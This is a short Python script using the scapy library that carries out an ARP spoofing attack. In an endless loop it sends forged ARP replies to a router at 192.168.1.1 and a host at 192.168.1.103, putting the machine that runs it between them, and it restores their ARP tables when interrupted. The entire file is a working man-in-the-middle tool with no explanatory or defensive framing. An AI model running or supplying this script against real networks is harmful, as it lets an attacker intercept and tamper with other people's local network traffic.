#!/usr/bin/python

import scapy.all as scapy


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    pkt = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(pkt, verbose=False)


def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broad = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
    fin_pkt = broad / arp_req
    res = scapy.srp(fin_pkt, timeout=2, verbose=False)[0]
    mac = res[0][1].hwsrc
    return mac


def spoofy(tgt_ip, spf_ip):
    mac = get_mac(tgt_ip)
    pkt = scapy.ARP(op=2, hwdst=mac, pdst=tgt_ip, psrc=spf_ip)
    scapy.send(pkt, verbose=False)


if __name__ == "__main__":
    try:
        while True:
            print("ARP being spoofed...")
            spoofy("192.168.1.1", "192.168.1.103")
            spoofy("192.168.1.103", "192.168.1.1")
    except KeyboardInterrupt:
        restore("192.168.1.1", "192.168.1.103")
        restore("192.168.1.103", "192.168.1.1")
        exit(0)
